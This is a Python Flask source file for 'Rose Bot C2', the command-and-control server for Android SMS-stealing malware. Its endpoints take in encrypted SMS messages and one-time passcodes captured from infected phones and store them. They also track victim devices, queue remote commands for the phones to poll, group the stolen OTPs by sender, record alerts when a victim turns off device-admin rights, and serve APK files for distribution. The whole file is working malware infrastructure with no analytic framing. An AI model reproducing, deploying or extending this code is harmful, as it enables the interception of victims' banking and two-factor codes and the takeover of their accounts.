import os
import json
import base64
import re
from flask import Flask, request, jsonify, send_from_directory
from flask_cors import CORS
from Crypto.Cipher import AES
from supabase import create_client, Client
from datetime import datetime, timedelta
import threading
import time

app = Flask(__name__)
CORS(app)

SUPABASE_URL = os.environ.get('SUPABASE_URL')
SUPABASE_KEY = os.environ.get('SUPABASE_SECRET_KEY')

if not SUPABASE_URL or not SUPABASE_KEY:
    raise RuntimeError("SUPABASE_URL and SUPABASE_SECRET_KEY must be set")

supabase: Client = create_client(SUPABASE_URL, SUPABASE_KEY)
AES_KEY = os.environ.get('AES_KEY', '0123456789abcdef0123456789abcdef')

# ---------- Helper Functions ----------
def is_phone_number(text):
    if not text:
        return False
    return bool(re.match(r'^\+?[\d\s\-()]{8,}$', re.sub(r'[\s\-()]', '', text)))

SMS_APP_PACKAGES = {
    'com.android.mms',
    'com.samsung.android.messaging',
    'com.google.android.apps.messaging',
    'com.android.messaging',
    'com.oneplus.mms',
    'com.sonyericsson.conversations',
    'com.motorola.blur.conversations',
    'com.asus.message',
    'com.android.mms.vivo',
    'com.android.mms.service',
}

def is_sms_app(sender):
    if not sender:
        return False
    return sender in SMS_APP_PACKAGES

# ---------- Periodic Cleanup for "Other" Messages ----------
def cleanup_other_messages():
    while True:
        try:
            five_hours_ago_ms = int((datetime.now() - timedelta(hours=5)).timestamp() * 1000)
            older = supabase.table('sms_log') \
                .select('*') \
                .lt('ts', five_hours_ago_ms) \
                .execute()
            to_delete = []
            for row in older.data:
                otp = row.get('otp', '')
                sender = row.get('sender', '')
                if not otp and not is_sms_app(sender) and not is_phone_number(sender):
                    to_delete.append(row['id'])
            if to_delete:
                for i in range(0, len(to_delete), 50):
                    batch = to_delete[i:i+50]
                    supabase.table('sms_log').delete().in_('id', batch).execute()
                print(f"Cleanup: deleted {len(to_delete)} 'other' messages older than 5 hours")
        except Exception as e:
            print(f"Cleanup error: {e}")
        time.sleep(3600)

threading.Thread(target=cleanup_other_messages, daemon=True).start()

# ---------- Routes ----------
@app.route('/')
def home():
    return jsonify({
        "status": "online",
        "message": "🚀 Rose Bot C2 is running with Supabase!",
        "endpoints": {
            "POST /api/sms": "receive encrypted SMS/OTP data",
            "POST /api/device": "register/update device status",
            "DELETE /api/device/<device_id>": "delete a device",
            "GET /api/devices": "list all devices",
            "GET /api/commands?device_id=xxx": "poll pending commands",
            "POST /api/commands": "send a command to a device",
            "POST /api/commands/update": "report command execution status",
            "GET /api/logs": "get SMS logs (filter by type: sms, otp, other)",
            "DELETE /api/log/<int:log_id>": "delete a specific log entry",
            "GET /api/senders": "get grouped sender stats",
            "GET /api/stats": "get total and unique counts",
            "POST /api/alert": "receive admin deactivation alerts",
            "GET /ping": "health check"
        }
    }), 200

@app.route('/ping', methods=['GET'])
def ping():
    return "pong", 200

# ---------- Device Management ----------
@app.route('/api/device', methods=['POST'])
def update_device():
    data = request.json
    device_id = data.get('device_id')
    if not device_id:
        return jsonify({"error": "device_id required"}), 400

    existing = supabase.table('devices').select('*').eq('device_id', device_id).execute()
    exists = len(existing.data) > 0

    update_data = {}
    if 'model' in data:
        update_data['model'] = data['model']
    if 'battery' in data:
        update_data['battery'] = data['battery']
    if 'status' in data:
        update_data['status'] = data['status']
    if 'is_owner' in data:
        update_data['is_owner'] = data['is_owner']
    update_data['last_seen'] = datetime.now().isoformat()

    try:
        if exists:
            supabase.table('devices').update(update_data).eq('device_id', device_id).execute()
        else:
            insert_data = {
                'device_id': device_id,
                'model': data.get('model', 'Unknown'),
                'battery': data.get('battery', 0),
                'status': data.get('status', 'online'),
                'last_seen': datetime.now().isoformat(),
                'is_owner': data.get('is_owner', False)
            }
            supabase.table('devices').insert(insert_data).execute()
        return jsonify({"status": "ok"}), 200
    except Exception as e:
        print("Device update error:", e)
        return jsonify({"error": str(e)}), 500

@app.route('/api/devices', methods=['GET'])
def get_devices():
    try:
        result = supabase.table('devices').select('*').order('last_seen', desc=True).execute()
        return jsonify(result.data), 200
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/device/<device_id>', methods=['DELETE'])
def delete_device(device_id):
    try:
        supabase.table('commands').delete().eq('device_id', device_id).execute()
        supabase.table('devices').delete().eq('device_id', device_id).execute()
        return jsonify({"status": "ok"}), 200
    except Exception as e:
        return jsonify({"error": str(e)}), 500

# ---------- Commands ----------
@app.route('/api/commands', methods=['GET'])
def get_commands():
    device_id = request.args.get('device_id')
    if not device_id:
        return jsonify({"error": "device_id required"}), 400
    try:
        result = supabase.table('commands') \
            .select('id, command_type, payload') \
            .eq('device_id', device_id) \
            .eq('status', 'pending') \
            .order('created_at', desc=False) \
            .limit(10) \
            .execute()
        return jsonify(result.data), 200
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/commands/update', methods=['POST'])
def update_command():
    data = request.json
    cmd_id = data.get('id')
    status = data.get('status')
    if not cmd_id or not status:
        return jsonify({"error": "id and status required"}), 400
    try:
        supabase.table('commands') \
            .update({'status': status, 'executed_at': datetime.now().isoformat()}) \
            .eq('id', cmd_id) \
            .execute()
        return jsonify({"status": "ok"}), 200
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/commands', methods=['POST'])
def send_command():
    data = request.json
    device_id = data.get('device_id')
    command_type = data.get('command_type')
    payload = data.get('payload')
    if not all([device_id, command_type, payload]):
        return jsonify({"error": "missing fields"}), 400
    try:
        supabase.table('commands').insert({
            'device_id': device_id,
            'command_type': command_type,
            'payload': payload,
            'status': 'pending',
            'created_at': datetime.now().isoformat()
        }).execute()
        return jsonify({"status": "ok"}), 200
    except Exception as e:
        return jsonify({"error": str(e)}), 500

# ---------- SMS Receive ----------
@app.route('/api/sms', methods=['POST'])
def receive_sms():
    try:
        data = request.json.get('data')
        if not data:
            return jsonify({"error": "No data"}), 400
        encrypted = base64.b64decode(data)
        cipher = AES.new(AES_KEY.encode(), AES.MODE_ECB)
        decrypted = cipher.decrypt(encrypted)
        pad_len = decrypted[-1]
        decrypted = decrypted[:-pad_len]
        payload = json.loads(decrypted.decode('utf-8'))
        sender = payload.get('sender', '')
        full_text = payload.get('full_text', '')
        otp = payload.get('otp', '')
        device_id = payload.get('device_id', '')
        ts = payload.get('ts', 0)
        battery = payload.get('battery', 0)
        model = payload.get('model', 'Unknown')
        supabase.table('sms_log').insert({
            'sender': sender,
            'full_text': full_text,
            'otp': otp,
            'device_id': device_id,
            'ts': ts
        }).execute()
        if device_id:
            update_data = {}
            if model:
                update_data['model'] = model
            if battery:
                update_data['battery'] = battery
            update_data['status'] = 'online'
            update_data['last_seen'] = datetime.now().isoformat()
            supabase.table('devices').update(update_data).eq('device_id', device_id).execute()
        return jsonify({"status": "ok"}), 200
    except Exception as e:
        print("SMS error:", e)
        return jsonify({"error": str(e)}), 500

# ---------- Logs ----------
@app.route('/api/logs', methods=['GET'])
def get_logs():
    log_type = request.args.get('type', 'all')
    limit = request.args.get('limit', 100, type=int)
    try:
        query = supabase.table('sms_log').select('*').order('ts', desc=True).limit(limit)
        result = query.execute()
        logs = result.data
        if log_type == 'sms':
            logs = [log for log in logs if is_sms_app(log.get('sender', ''))]
        elif log_type == 'otp':
            logs = [log for log in logs if log.get('otp', '')]
        elif log_type == 'other':
            logs = [log for log in logs if not log.get('otp', '') and not is_sms_app(log.get('sender', '')) and not is_phone_number(log.get('sender', ''))]
        return jsonify(logs), 200
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/log/<int:log_id>', methods=['DELETE'])
def delete_log(log_id):
    try:
        supabase.table('sms_log').delete().eq('id', log_id).execute()
        return jsonify({"status": "ok"}), 200
    except Exception as e:
        return jsonify({"error": str(e)}), 500

# ---------- Stats ----------
@app.route('/api/stats', methods=['GET'])
def get_stats():
    try:
        total = supabase.table('sms_log').select('*', count='exact').execute().count
        all_logs = supabase.table('sms_log').select('*').execute().data
        sms_count = sum(1 for log in all_logs if is_sms_app(log.get('sender', '')))
        otp_count = sum(1 for log in all_logs if log.get('otp', ''))
        other_count = len(all_logs) - sms_count - otp_count
        return jsonify({
            "total": total,
            "sms": sms_count,
            "otp": otp_count,
            "other": other_count
        }), 200
    except Exception as e:
        return jsonify({"error": str(e)}), 500

# ---------- Senders (Grouped) ----------
@app.route('/api/senders', methods=['GET'])
def get_senders():
    try:
        result = supabase.table('sms_log').select('sender, otp, full_text, ts').execute()
        logs = result.data
        from collections import defaultdict
        groups = defaultdict(list)
        for log in logs:
            groups[log['sender']].append(log)
        senders_list = []
        for sender, entries in groups.items():
            latest = max(entries, key=lambda x: x['ts'])
            senders_list.append({
                'sender': sender,
                'total': len(entries),
                'latest_otp': latest.get('otp', ''),
                'latest_text': latest.get('full_text', ''),
                'last_ts': latest['ts']
            })
        senders_list.sort(key=lambda x: x['last_ts'], reverse=True)
        return jsonify(senders_list), 200
    except Exception as e:
        return jsonify({"error": str(e)}), 500

# ---------- Alert (for admin deactivation) ----------
@app.route('/api/alert', methods=['POST'])
def receive_alert():
    try:
        data = request.json
        device_id = data.get('device_id')
        event = data.get('event')
        timestamp = data.get('timestamp')
        # Log to console
        print(f"⚠️ Alert from {device_id}: {event} at {timestamp}")
        # Optionally store in a table (create 'alerts' table if needed)
        # supabase.table('alerts').insert({
        #     'device_id': device_id,
        #     'event': event,
        #     'timestamp': timestamp
        # }).execute()
        return jsonify({"status": "ok"}), 200
    except Exception as e:
        print(f"Alert error: {e}")
        return jsonify({"error": str(e)}), 500

# ---------- Serve APK ----------
@app.route('/apk/<filename>')
def serve_apk(filename):
    return send_from_directory('static/apk', filename)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
